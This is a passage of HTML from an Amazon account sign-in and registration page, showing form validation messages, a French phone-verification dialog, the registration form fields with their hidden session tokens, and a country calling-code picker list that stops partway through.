    <li id="auth-customerName-missing-alert"><span class="a-list-item">
      Enter your name
    </span></li>
    <li id="auth-customerNamePronunciation-missing-alert"><span class="a-list-item">
      Enter your name pronunciation
    </span></li>
    <li id="auth-phoneNumber-missing-alert"><span class="a-list-item">
      Enter your mobile number
    </span></li>
    <li id="auth-phoneNumber-invalid-phone-alert"><span class="a-list-item">
      The mobile number you entered does not seem to be valid
    </span></li>
    <li id="auth-email-missing-alert"><span class="a-list-item">
      Enter your email or mobile phone number
    </span></li>
    <li id="auth-password-missing-alert"><span class="a-list-item">
      Enter your password
    </span></li>
    <li id="auth-password-invalid-password-alert"><span class="a-list-item">
      Passwords must be at least 6 characters.
    </span></li>
    <li id="auth-guess-missing-alert"><span class="a-list-item">
      Enter the characters as they are given in the challenge.
    </span></li>
    <li id="auth-email-invalid-email-alert"><span class="a-list-item">
      Enter a valid email address
    </span></li>
    <li id="auth-signin-legal-agreement-checkbox-unchecked-alert"><span class="a-list-item">
      Please read and agree to Amazon's Conditions of Use and Privacy Policy
    </span></li>
    <li id="auth-cbdtAgreementCheckBox-unchecked-alert"><span class="a-list-item">
      To create an account with Amazon, please agree to our Conditions of Use and Sale and our Privacy Policy
    </span></li>
  </ul>
</div></div></div>
<div id="outer-accordion-signin-signup-page" class="a-section">
  <h2>
    Welcome
  </h2>

  <script type="a-state" data-a-state="{&quot;key&quot;:&quot;smartLockAttrs&quot;}">{"isSupported":false}</script>

  <div id="accordion-signin-signup-page" data-a-accordion-name="accordion-signin-signup-page" class="a-box-group a-accordion a-spacing-medium a-spacing-top-mini" role="radioGroup">

    





<!--Variables for register -->









  
  
    
  




  <div id="accordion-row-register" class="a-box" data-a-accordion-row-name="accordion-row-register"><div class="a-box-inner a-accordion-row-container">
    
      <div class="a-accordion-row-a11y" role="radio" aria-checked="false" aria-expanded="false"><a id="register_accordion_header" data-csa-c-func-deps="aui-da-a-accordion" data-csa-c-type="widget" data-csa-interaction-events="click" data-action="a-accordion" class="a-accordion-row a-declarative" href="https://www.amazon.fr/ap/register?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.return_to=https%3A%2F%2Fwww.amazon.fr%2F%3Fref_%3Dnav_custrec_signin&amp;prevRID=Q2E2JWSX05HN7DAWWE8S&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.assoc_handle=anywhere_v2_fr&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=anywhere_fr&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0" aria-label="" data-csa-c-id="qv0yfn-gvny9w-80it8j-9e3i0z"><i class="a-icon a-accordion-radio a-icon-radio-inactive"></i><h5>
        <div class="a-row">
          <span class="a-size-base a-text-bold">Create account</span>.
          <span class="a-size-small accordionHeaderMessage">
                  New to Amazon?</span>
        </div>
      </h5></a></div>
    
    <div class="a-accordion-inner">
      
      









	

<script type="a-state" data-a-state="{&quot;key&quot;:&quot;auth-phone-verification-modal&quot;}">{"formIdToBindTo":"ap_register_form"}</script>

<span class="a-declarative" data-action="a-modal" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-a-modal" data-a-modal="{&quot;max-width&quot;:&quot;95%&quot;,&quot;width&quot;:&quot;300px&quot;,&quot;name&quot;:&quot;verifyContinueModal&quot;,&quot;header&quot;:&quot;Vérification requise&quot;,&quot;height&quot;:&quot;240px&quot;}" id="auth-verify-modal-action" data-csa-c-id="s0ahxo-jt3dvq-5adg9q-1vhtng"></span>


<div class="a-popover-preload" id="a-popover-verifyContinueModal">
  
  <div class="a-row">
    <p>
      Nous vous enverrons un message pour vérifier ce numéro&nbsp;:
    </p>
  </div>

  <div class="a-row">
    <span id="auth-register-verify-mobile-number-text" class="a-size-small a-text-bold">
      
      <span id="auth-verify-mobile-country-code"></span>
      <span>
        +<span id="auth-verify-mobile-calling-code"></span>
      </span>
      <span id="auth-verify-mobile-national-number"></span>
    </span>
  </div>

  <div class="a-row a-spacing-top-extra-large">
    <span class="a-size-mini">
      Des tarifs de communication et d’utilisation des données peuvent s'appliquer.
    </span>
  </div>

  <hr aria-hidden="true" class="a-divider-normal">

  
    
    
    
      
      
      
      
    
  

  <div class="a-row">
    <div class="a-column a-span6">
      <span class="a-declarative" data-action="a-popover-close" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-a-popover-close" data-a-popover-close="{}" data-csa-c-id="r6fevt-ar324j-xulv9f-kbu28i">
        <span id="auth-verification-cancel" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><input class="a-button-input" type="submit" aria-labelledby="auth-verification-cancel-announce"><span id="auth-verification-cancel-announce" class="a-button-text" aria-hidden="true">
          Annuler
        </span></span></span>
      </span>
    </div>

    <div class="a-column a-span6 a-span-last">
      <span class="a-declarative" data-action="auth-verify-modal-complete" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-auth-verify-modal-complete" data-auth-verify-modal-complete="{}" data-csa-c-id="vuy6ik-vjhy0d-j4vafi-qy81ue">
        <span id="auth-verification-ok" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><button id="auth-verification-ok-announce" class="a-button-text" type="button">
          OK
        </button></span></span>
      </span>
    </div>
  </div>
</div>


      <div class="a-section a-spacing-large mp_reg_fix">
        
          
            
            
            
            
          
          
        

      <form id="ap_register_form" name="register" method="post" novalidate="" action="https://www.amazon.com/ap/register" data-enable-mobile-account-js="true" data-show-optional-email-field="true" class="ap_ango_default fwcim-form auth-validate-form auth-clearable-form">

          
<input type="hidden" name="appActionToken" value="viuCdR4Ptb9GSLbLBE6TB8dCorsj3D"><input type="hidden" name="appAction" value="REGISTER">
<input type="hidden" name="shouldShowPersistentLabels" value="true">








<input type="hidden" name="webAuthnChallengeIdForAutofill" value="g607l2ocYsJNOBAYMr4Vv93Sic4fNnCO:NA">

<input type="hidden" name="webAuthnGetParametersForAutofill" value="eyJycElkIjoiYW1hem9uLmNvbSIsImNoYWxsZW5nZSI6Imc2MDdsMm9jWXNKTk9CQVlNcjRWdjkzU2ljNGZObkNPIiwidGltZW91dCI6OTAwMDAwLCJhbGxvd0NyZWRlbnRpYWxzIjpudWxsLCJtZWRpYXRpb24iOiJjb25kaXRpb25hbCIsInVzZXJWZXJpZmljYXRpb24iOiJwcmVmZXJyZWQifQ==">

<input type="hidden" name="openid.return_to" value="ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9yZWY9bmF2X3NpZ25pbg==">

<input type="hidden" name="prevRID" value="ape:UjBXMDJRMVFQSlNSVDhUSjRZSDY=">

<input type="hidden" name="workflowState" value="eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.SgL4ovBHWbFPXkOL58r9OApu2_392UzeN2dgILmn-bEfqxYxwzb6PA.SP3Wf49dlegzKlzm.fXm0xLv2og_eflPAkfdUKZRWaAZPU6n-dSMYPNj7SYlkF_XQCZiaqgbRUifJ5B0T7dWv-_qJ2Lq4hBrvSJjeVhq3QYWopiuq5Qmu70c6xvc1ZxUArF7jz9oiWSMeqTDkL5tKCucxinXVqja2twb9Y0ioj_2wjMRe7_PWOoLdlFHZDkHWOJz4zvihirCQuMfzmXmc6JJY8OukcyJF72FiVHEfrgeDaepoLNj3-0RCPXiNEUvUKoCIYuV1Ffv6ecOYuCVFikZIrbQrBCt7qXQmfz9nKmy8EQ5RX-wYyAPrW4Y7bFy0W7WYCaGTpS8G8fnJ3LWRYEd65QE.JgcWVqjoxICymRKpDD50ZQ">




<div class="a-row a-spacing-base">
  <label for="ap_customer_name" aria-hidden="true" class="a-form-label">
    First and last name
  </label>

  <div class="a-input-text-wrapper auth-required-field accordionFontFamily"><input type="text" maxlength="50" id="ap_customer_name" autocomplete="name" name="customerName" aria-label="First and last name" aria-required="true"></div>

  



<div id="ap_customer_name_icon" class="auth-clear-icons" tabindex="0" style="display: none;">


<i class="a-icon a-icon-close" role="img" aria-label="Clear customer name text field, button"></i>

</div>
  













































<div id="auth-customerName-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
Enter your name
</div></div></div>
























  
</div>





  
  
    
  



  
  
    
      
      
        
        

























<input type="hidden" name="countryCode" value="US" id="auth-country-picker" class="auth-country-picker" disabled="disabled">

<div class="a-row a-spacing-base">
<label for="ap_email" aria-hidden="true" class="a-form-label">
Mobile number or email
</label>

<div data-validation-id="email" class="a-input-text-wrapper auth-required-field auth-require-claim-validation moa-single-claim-input-field-container"><div class="a-section country-picker aok-hidden" style="display: none;">



  <span class="a-declarative" data-action="a-sheet" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-a-sheet" data-a-sheet="{&quot;sheetType&quot;:&quot;web&quot;,&quot;name&quot;:&quot;country_bottom_sheet&quot;,&quot;preloadDomId&quot;:&quot;country_bottom_sheet_container&quot;,&quot;closeType&quot;:&quot;icon&quot;}" data-csa-c-id="ma6w7o-653nqm-nagld8-enry77">
    <span class="country-display-text">US +1</span>
  </span>


</div><input type="email" maxlength="64" id="ap_email" autocomplete="tel" name="email" aria-describedby="ap_email_context_message_section" aria-label="Mobile number or email" aria-required="true" autocorrect="off" autocapitalize="off"></div>





<div id="ap_email_icon" class="auth-clear-icons" tabindex="0" style="display: none;">


<i class="a-icon a-icon-close" role="img" aria-label="Clear email text field, button"></i>

</div>


<div id="ap_email_context_message_section" class="a-section a-spacing-none">
























































<div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
Enter your email or mobile phone number
</div></div></div>





<div id="auth-email-invalid-claim-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
Wrong or Invalid email address or mobile phone number. Please correct and try again.
</div></div></div>

















</div>









<div id="country_bottom_sheet_container" class="aok-hidden">
<div class="a-container ap-no-padding">
<span class="a-declarative" data-action="select_country" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-select_country" data-select_country="{}" data-csa-c-id="nwkk0z-j83vwx-tm42cz-8hqkyn">
<ul id="ap-countries-list" class="a-unordered-list a-nostyle a-vertical ap-countries-list">



<li data-country-code-text="AF +93" data-value="AF"><span class="a-list-item">
  Afghanistan <span dir="ltr">+93</span>
</span></li>



<li data-country-code-text="AL +355" data-value="AL"><span class="a-list-item">
  Albania <span dir="ltr">+355</span>
</span></li>



<li data-country-code-text="DZ +213" data-value="DZ"><span class="a-list-item">
  Algeria <span dir="ltr">+213</span>
</span></li>



<li data-country-code-text="AS +1" data-value="AS"><span class="a-list-item">
  American Samoa <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="AD +376" data-value="AD"><span class="a-list-item">
  Andorra <span dir="ltr">+376</span>
</span></li>



<li data-country-code-text="AO +244" data-value="AO"><span class="a-list-item">
  Angola <span dir="ltr">+244</span>
</span></li>



<li data-country-code-text="AG +1" data-value="AG"><span class="a-list-item">
  Antigua &amp; Barbuda <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="AR +54" data-value="AR"><span class="a-list-item">
  Argentina <span dir="ltr">+54</span>
</span></li>



<li data-country-code-text="AM +374" data-value="AM"><span class="a-list-item">
  Armenia <span dir="ltr">+374</span>
</span></li>



<li data-country-code-text="AW +297" data-value="AW"><span class="a-list-item">
  Aruba <span dir="ltr">+297</span>
</span></li>



<li data-country-code-text="AU +61" data-value="AU"><span class="a-list-item">
  Australia <span dir="ltr">+61</span>
</span></li>



<li data-country-code-text="AT +43" data-value="AT"><span class="a-list-item">
  Austria <span dir="ltr">+43</span>
</span></li>



<li data-country-code-text="AZ +994" data-value="AZ"><span class="a-list-item">
  Azerbaijan <span dir="ltr">+994</span>
</span></li>



<li data-country-code-text="BS +1" data-value="BS"><span class="a-list-item">
  Bahamas <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="BH +973" data-value="BH"><span class="a-list-item">
  Bahrain <span dir="ltr">+973</span>
</span></li>



<li data-country-code-text="BD +880" data-value="BD"><span class="a-list-item">
  Bangladesh <span dir="ltr">+880</span>
</span></li>



<li data-country-code-text="BB +1" data-value="BB"><span class="a-list-item">
  Barbados <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="BY +375" data-value="BY"><span class="a-list-item">
  Belarus <span dir="ltr">+375</span>
</span></li>



<li data-country-code-text="BE +32" data-value="BE"><span class="a-list-item">
  Belgium <span dir="ltr">+32</span>
</span></li>



<li data-country-code-text="BZ +501" data-value="BZ"><span class="a-list-item">
  Belize <span dir="ltr">+501</span>
</span></li>



<li data-country-code-text="BJ +229" data-value="BJ"><span class="a-list-item">
  Benin <span dir="ltr">+229</span>
</span></li>



<li data-country-code-text="BM +1" data-value="BM"><span class="a-list-item">
  Bermuda <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="BT +975" data-value="BT"><span class="a-list-item">
  Bhutan <span dir="ltr">+975</span>
</span></li>



<li data-country-code-text="BO +591" data-value="BO"><span class="a-list-item">
  Bolivia <span dir="ltr">+591</span>
</span></li>



<li data-country-code-text="BA +387" data-value="BA"><span class="a-list-item">
  Bosnia &amp; Herzegovina <span dir="ltr">+387</span>
</span></li>



<li data-country-code-text="BW +267" data-value="BW"><span class="a-list-item">
  Botswana <span dir="ltr">+267</span>
</span></li>



<li data-country-code-text="BR +55" data-value="BR"><span class="a-list-item">
  Brazil <span dir="ltr">+55</span>
</span></li>



<li data-country-code-text="VG +1" data-value="VG"><span class="a-list-item">
  British Virgin Islands <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="BN +673" data-value="BN"><span class="a-list-item">
  Brunei <span dir="ltr">+673</span>
</span></li>



<li data-country-code-text="BG +359" data-value="BG"><span class="a-list-item">
  Bulgaria <span dir="ltr">+359</span>
</span></li>



<li data-country-code-text="BF +226" data-value="BF"><span class="a-list-item">
  Burkina Faso <span dir="ltr">+226</span>
</span></li>



<li data-country-code-text="BI +257" data-value="BI"><span class="a-list-item">
  Burundi <span dir="ltr">+257</span>
</span></li>



<li data-country-code-text="KH +855" data-value="KH"><span class="a-list-item">
  Cambodia <span dir="ltr">+855</span>
</span></li>



<li data-country-code-text="CM +237" data-value="CM"><span class="a-list-item">
  Cameroon <span dir="ltr">+237</span>
</span></li>



<li data-country-code-text="CA +1" data-value="CA"><span class="a-list-item">
  Canada <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="CV +238" data-value="CV"><span class="a-list-item">
  Cape Verde <span dir="ltr">+238</span>
</span></li>



<li data-country-code-text="BQ +599" data-value="BQ"><span class="a-list-item">
  Caribbean Netherlands <span dir="ltr">+599</span>
</span></li>



<li data-country-code-text="KY +1" data-value="KY"><span class="a-list-item">
  Cayman Islands <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="CF +236" data-value="CF"><span class="a-list-item">
  Central African Republic <span dir="ltr">+236</span>
</span></li>



<li data-country-code-text="TD +235" data-value="TD"><span class="a-list-item">
  Chad <span dir="ltr">+235</span>
</span></li>



<li data-country-code-text="CL +56" data-value="CL"><span class="a-list-item">
  Chile <span dir="ltr">+56</span>
</span></li>



<li data-country-code-text="CN +86" data-value="CN"><span class="a-list-item">
  China <span dir="ltr">+86</span>
</span></li>



<li data-country-code-text="CO +57" data-value="CO"><span class="a-list-item">
  Colombia <span dir="ltr">+57</span>
</span></li>



<li data-country-code-text="KM +269" data-value="KM"><span class="a-list-item">
  Comoros <span dir="ltr">+269</span>
</span></li>



<li data-country-code-text="CG +242" data-value="CG"><span class="a-list-item">
  Congo - Brazzaville <span dir="ltr">+242</span>
</span></li>



<li data-country-code-text="CD +243" data-value="CD"><span class="a-list-item">
  Congo - Kinshasa <span dir="ltr">+243</span>
</span></li>



<li data-country-code-text="CK +682" data-value="CK"><span class="a-list-item">
  Cook Islands <span dir="ltr">+682</span>
</span></li>



<li data-country-code-text="CR +506" data-value="CR"><span class="a-list-item">
  Costa Rica <span dir="ltr">+506</span>
</span></li>



<li data-country-code-text="HR +385" data-value="HR"><span class="a-list-item">
  Croatia <span dir="ltr">+385</span>
</span></li>



<li data-country-code-text="CU +53" data-value="CU"><span class="a-list-item">
  Cuba <span dir="ltr">+53</span>
</span></li>



<li data-country-code-text="CW +599" data-value="CW"><span class="a-list-item">
  Curaçao <span dir="ltr">+599</span>
</span></li>



<li data-country-code-text="CY +357" data-value="CY"><span class="a-list-item">
  Cyprus <span dir="ltr">+357</span>
</span></li>



<li data-country-code-text="CZ +420" data-value="CZ"><span class="a-list-item">
  Czech Republic <span dir="ltr">+420</span>
</span></li>



<li data-country-code-text="CI +225" data-value="CI"><span class="a-list-item">
  Côte d’Ivoire <span dir="ltr">+225</span>
</span></li>



<li data-country-code-text="DK +45" data-value="DK"><span class="a-list-item">
  Denmark <span dir="ltr">+45</span>
</span></li>



<li data-country-code-text="DJ +253" data-value="DJ"><span class="a-list-item">
  Djibouti <span dir="ltr">+253</span>
</span></li>



<li data-country-code-text="DM +1" data-value="DM"><span class="a-list-item">
  Dominica <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="DO +1" data-value="DO"><span class="a-list-item">
  Dominican Republic <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="EC +593" data-value="EC"><span class="a-list-item">
  Ecuador <span dir="ltr">+593</span>
</span></li>



<li data-country-code-text="EG +20" data-value="EG"><span class="a-list-item">
  Egypt <span dir="ltr">+20</span>
</span></li>



<li data-country-code-text="SV +503" data-value="SV"><span class="a-list-item">
  El Salvador <span dir="ltr">+503</span>
</span></li>



<li data-country-code-text="GQ +240" data-value="GQ"><span class="a-list-item">
  Equatorial Guinea <span dir="ltr">+240</span>
</span></li>



<li data-country-code-text="ER +291" data-value="ER"><span class="a-list-item">
  Eritrea <span dir="ltr">+291</span>
</span></li>



<li data-country-code-text="EE +372" data-value="EE"><span class="a-list-item">
  Estonia <span dir="ltr">+372</span>
</span></li>



<li data-country-code-text="ET +251" data-value="ET"><span class="a-list-item">
  Ethiopia <span dir="ltr">+251</span>
</span></li>



<li data-country-code-text="FK +500" data-value="FK"><span class="a-list-item">
  Falkland Islands <span dir="ltr">+500</span>
</span></li>



<li data-country-code-text="FO +298" data-value="FO"><span class="a-list-item">
  Faroe Islands <span dir="ltr">+298</span>
</span></li>



<li data-country-code-text="FJ +679" data-value="FJ"><span class="a-list-item">
  Fiji <span dir="ltr">+679</span>
</span></li>



<li data-country-code-text="FI +358" data-value="FI"><span class="a-list-item">
  Finland <span dir="ltr">+358</span>
</span></li>



<li data-country-code-text="FR +33" data-value="FR"><span class="a-list-item">
  France <span dir="ltr">+33</span>
</span></li>



<li data-country-code-text="GF +594" data-value="GF"><span class="a-list-item">
  French Guiana <span dir="ltr">+594</span>
</span></li>



<li data-country-code-text="PF +689" data-value="PF"><span class="a-list-item">
  French Polynesia <span dir="ltr">+689</span>
</span></li>



<li data-country-code-text="GA +241" data-value="GA"><span class="a-list-item">
  Gabon <span dir="ltr">+241</span>
</span></li>



<li data-country-code-text="GM +220" data-value="GM"><span class="a-list-item">
  Gambia <span dir="ltr">+220</span>
</span></li>



<li data-country-code-text="GE +995" data-value="GE"><span class="a-list-item">
  Georgia <span dir="ltr">+995</span>
</span></li>



<li data-country-code-text="DE +49" data-value="DE"><span class="a-list-item">
  Germany <span dir="ltr">+49</span>
</span></li>



<li data-country-code-text="GH +233" data-value="GH"><span class="a-list-item">
  Ghana <span dir="ltr">+233</span>
</span></li>



<li data-country-code-text="GI +350" data-value="GI"><span class="a-list-item">
  Gibraltar <span dir="ltr">+350</span>
</span></li>



<li data-country-code-text="GR +30" data-value="GR"><span class="a-list-item">
  Greece <span dir="ltr">+30</span>
</span></li>



<li data-country-code-text="GL +299" data-value="GL"><span class="a-list-item">
  Greenland <span dir="ltr">+299</span>
</span></li>



<li data-country-code-text="GD +1" data-value="GD"><span class="a-list-item">
  Grenada <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="GP +590" data-value="GP"><span class="a-list-item">
  Guadeloupe <span dir="ltr">+590</span>
</span></li>



<li data-country-code-text="GU +1" data-value="GU"><span class="a-list-item">
  Guam <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="GT +502" data-value="GT"><span class="a-list-item">
  Guatemala <span dir="ltr">+502</span>
</span></li>



<li data-country-code-text="GN +224" data-value="GN"><span class="a-list-item">
  Guinea <span dir="ltr">+224</span>
</span></li>



<li data-country-code-text="GW +245" data-value="GW"><span class="a-list-item">
  Guinea-Bissau <span dir="ltr">+245</span>
</span></li>



<li data-country-code-text="GY +592" data-value="GY"><span class="a-list-item">
  Guyana <span dir="ltr">+592</span>
</span></li>



<li data-country-code-text="HT +509" data-value="HT"><span class="a-list-item">
  Haiti <span dir="ltr">+509</span>
</span></li>



<li data-country-code-text="HN +504" data-value="HN"><span class="a-list-item">
  Honduras <span dir="ltr">+504</span>
</span></li>



<li data-country-code-text="HK +852" data-value="HK"><span class="a-list-item">
  Hong Kong <span dir="ltr">+852</span>
</span></li>



<li data-country-code-text="HU +36" data-value="HU"><span class="a-list-item">
  Hungary <span dir="ltr">+36</span>
</span></li>



<li data-country-code-text="IS +354" data-value="IS"><span class="a-list-item">
  Iceland <span dir="ltr">+354</span>
</span></li>



<li data-country-code-text="IN +91" data-value="IN"><span class="a-list-item">
  India <span dir="ltr">+91</span>
</span></li>



<li data-country-code-text="ID +62" data-value="ID"><span class="a-list-item">
  Indonesia <span dir="ltr">+62</span>
</span></li>



<li data-country-code-text="IR +98" data-value="IR"><span class="a-list-item">
  Iran <span dir="ltr">+98</span>
</span></li>



<li data-country-code-text="IQ +964" data-value="IQ"><span class="a-list-item">
  Iraq <span dir="ltr">+964</span>
</span></li>



<li data-country-code-text="IE +353" data-value="IE"><span class="a-list-item">
  Ireland <span dir="ltr">+353</span>
</span></li>



<li data-country-code-text="IL +972" data-value="IL"><span class="a-list-item">
  Israel <span dir="ltr">+972</span>
</span></li>



<li data-country-code-text="IT +39" data-value="IT"><span class="a-list-item">
  Italy <span dir="ltr">+39</span>
</span></li>



<li data-country-code-text="JM +1" data-value="JM"><span class="a-list-item">
  Jamaica <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="JP +81" data-value="JP"><span class="a-list-item">
  Japan <span dir="ltr">+81</span>
</span></li>



<li data-country-code-text="JO +962" data-value="JO"><span class="a-list-item">
  Jordan <span dir="ltr">+962</span>
</span></li>



<li data-country-code-text="KZ +7" data-value="KZ"><span class="a-list-item">
  Kazakhstan <span dir="ltr">+7</span>
</span></li>



<li data-country-code-text="KE +254" data-value="KE"><span class="a-list-item">
  Kenya <span dir="ltr">+254</span>
</span></li>



<li data-country-code-text="KI +686" data-value="KI"><span class="a-list-item">
  Kiribati <span dir="ltr">+686</span>
</span></li>



<li data-country-code-text="XK +383" data-value="XK"><span class="a-list-item">
  Kosovo <span dir="ltr">+383</span>
</span></li>



<li data-country-code-text="KW +965" data-value="KW"><span class="a-list-item">
  Kuwait <span dir="ltr">+965</span>
</span></li>



<li data-country-code-text="KG +996" data-value="KG"><span class="a-list-item">
  Kyrgyzstan <span dir="ltr">+996</span>
</span></li>



<li data-country-code-text="LA +856" data-value="LA"><span class="a-list-item">
  Laos <span dir="ltr">+856</span>
</span></li>



<li data-country-code-text="LV +371" data-value="LV"><span class="a-list-item">
  Latvia <span dir="ltr">+371</span>
</span></li>



<li data-country-code-text="LB +961" data-value="LB"><span class="a-list-item">
  Lebanon <span dir="ltr">+961</span>
</span></li>



<li data-country-code-text="LS +266" data-value="LS"><span class="a-list-item">
  Lesotho <span dir="ltr">+266</span>
</span></li>



<li data-country-code-text="LR +231" data-value="LR"><span class="a-list-item">
  Liberia <span dir="ltr">+231</span>
</span></li>



<li data-country-code-text="LY +218" data-value="LY"><span class="a-list-item">
  Libya <span dir="ltr">+218</span>
</span></li>



<li data-country-code-text="LI +423" data-value="LI"><span class="a-list-item">
  Liechtenstein <span dir="ltr">+423</span>
</span></li>



<li data-country-code-text="LT +370" data-value="LT"><span class="a-list-item">
  Lithuania <span dir="ltr">+370</span>
</span></li>



<li data-country-code-text="LU +352" data-value="LU"><span class="a-list-item">
  Luxembourg <span dir="ltr">+352</span>
</span></li>



<li data-country-code-text="MO +853" data-value="MO"><span class="a-list-item">
  Macau <span dir="ltr">+853</span>
</span></li>



<li data-country-code-text="MK +389" data-value="MK"><span class="a-list-item">
  Macedonia <span dir="ltr">+389</span>
</span></li>



<li data-country-code-text="MG +261" data-value="MG"><span class="a-list-item">
  Madagascar <span dir="ltr">+261</span>
</span></li>



<li data-country-code-text="MW +265" data-value="MW"><span class="a-list-item">
  Malawi <span dir="ltr">+265</span>
</span></li>



<li data-country-code-text="MY +60" data-value="MY"><span class="a-list-item">
  Malaysia <span dir="ltr">+60</span>
</span></li>



<li data-country-code-text="MV +960" data-value="MV"><span class="a-list-item">
  Maldives <span dir="ltr">+960</span>
</span></li>



<li data-country-code-text="ML +223" data-value="ML"><span class="a-list-item">
  Mali <span dir="ltr">+223</span>
</span></li>



<li data-country-code-text="MT +356" data-value="MT"><span class="a-list-item">
  Malta <span dir="ltr">+356</span>
</span></li>



<li data-country-code-text="MH +692" data-value="MH"><span class="a-list-item">
  Marshall Islands <span dir="ltr">+692</span>
</span></li>



<li data-country-code-text="MQ +596" data-value="MQ"><span class="a-list-item">
  Martinique <span dir="ltr">+596</span>
</span></li>



<li data-country-code-text="MR +222" data-value="MR"><span class="a-list-item">
  Mauritania <span dir="ltr">+222</span>
</span></li>



<li data-country-code-text="MU +230" data-value="MU"><span class="a-list-item">
  Mauritius <span dir="ltr">+230</span>
</span></li>



<li data-country-code-text="MX +52" data-value="MX"><span class="a-list-item">
  Mexico <span dir="ltr">+52</span>
</span></li>



<li data-country-code-text="FM +691" data-value="FM"><span class="a-list-item">
  Micronesia <span dir="ltr">+691</span>
</span></li>



<li data-country-code-text="MD +373" data-value="MD"><span class="a-list-item">
  Moldova <span dir="ltr">+373</span>
</span></li>



<li data-country-code-text="MC +377" data-value="MC"><span class="a-list-item">
  Monaco <span dir="ltr">+377</span>
</span></li>



<li data-country-code-text="MN +976" data-value="MN"><span class="a-list-item">
  Mongolia <span dir="ltr">+976</span>
</span></li>



<li data-country-code-text="ME +382" data-value="ME"><span class="a-list-item">
  Montenegro <span dir="ltr">+382</span>
</span></li>



<li data-country-code-text="MS +1" data-value="MS"><span class="a-list-item">
  Montserrat <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="MA +212" data-value="MA"><span class="a-list-item">
  Morocco <span dir="ltr">+212</span>
</span></li>



<li data-country-code-text="MZ +258" data-value="MZ"><span class="a-list-item">
  Mozambique <span dir="ltr">+258</span>
</span></li>



<li data-country-code-text="MM +95" data-value="MM"><span class="a-list-item">
  Myanmar (Burma) <span dir="ltr">+95</span>
</span></li>



<li data-country-code-text="NA +264" data-value="NA"><span class="a-list-item">
  Namibia <span dir="ltr">+264</span>
</span></li>



<li data-country-code-text="NR +674" data-value="NR"><span class="a-list-item">
  Nauru <span dir="ltr">+674</span>
</span></li>



<li data-country-code-text="NP +977" data-value="NP"><span class="a-list-item">
  Nepal <span dir="ltr">+977</span>
</span></li>



<li data-country-code-text="NL +31" data-value="NL"><span class="a-list-item">
  Netherlands <span dir="ltr">+31</span>
</span></li>



<li data-country-code-text="NC +687" data-value="NC"><span class="a-list-item">
  New Caledonia <span dir="ltr">+687</span>
</span></li>



<li data-country-code-text="NZ +64" data-value="NZ"><span class="a-list-item">
  New Zealand <span dir="ltr">+64</span>
</span></li>



<li data-country-code-text="NI +505" data-value="NI"><span class="a-list-item">
  Nicaragua <span dir="ltr">+505</span>
</span></li>



<li data-country-code-text="NE +227" data-value="NE"><span class="a-list-item">
  Niger <span dir="ltr">+227</span>
</span></li>



<li data-country-code-text="NG +234" data-value="NG"><span class="a-list-item">
  Nigeria <span dir="ltr">+234</span>
</span></li>



<li data-country-code-text="NU +683" data-value="NU"><span class="a-list-item">
  Niue <span dir="ltr">+683</span>
</span></li>



<li data-country-code-text="NF +672" data-value="NF"><span class="a-list-item">
  Norfolk Island <span dir="ltr">+672</span>
</span></li>



<li data-country-code-text="KP +850" data-value="KP"><span class="a-list-item">
  North Korea <span dir="ltr">+850</span>
</span></li>



<li data-country-code-text="NO +47" data-value="NO"><span class="a-list-item">
  Norway <span dir="ltr">+47</span>
</span></li>



<li data-country-code-text="OM +968" data-value="OM"><span class="a-list-item">
  Oman <span dir="ltr">+968</span>
</span></li>



<li data-country-code-text="PK +92" data-value="PK"><span class="a-list-item">
  Pakistan <span dir="ltr">+92</span>
</span></li>



<li data-country-code-text="PW +680" data-value="PW"><span class="a-list-item">
  Palau <span dir="ltr">+680</span>
</span></li>



<li data-country-code-text="PS +970" data-value="PS"><span class="a-list-item">
  Palestinian Territories <span dir="ltr">+970</span>
</span></li>



<li data-country-code-text="PA +507" data-value="PA"><span class="a-list-item">
  Panama <span dir="ltr">+507</span>
</span></li>



<li data-country-code-text="PG +675" data-value="PG"><span class="a-list-item">
  Papua New Guinea <span dir="ltr">+675</span>
</span></li>



<li data-country-code-text="PY +595" data-value="PY"><span class="a-list-item">
  Paraguay <span dir="ltr">+595</span>
</span></li>



<li data-country-code-text="PE +51" data-value="PE"><span class="a-list-item">
  Peru <span dir="ltr">+51</span>
</span></li>



<li data-country-code-text="PH +63" data-value="PH"><span class="a-list-item">
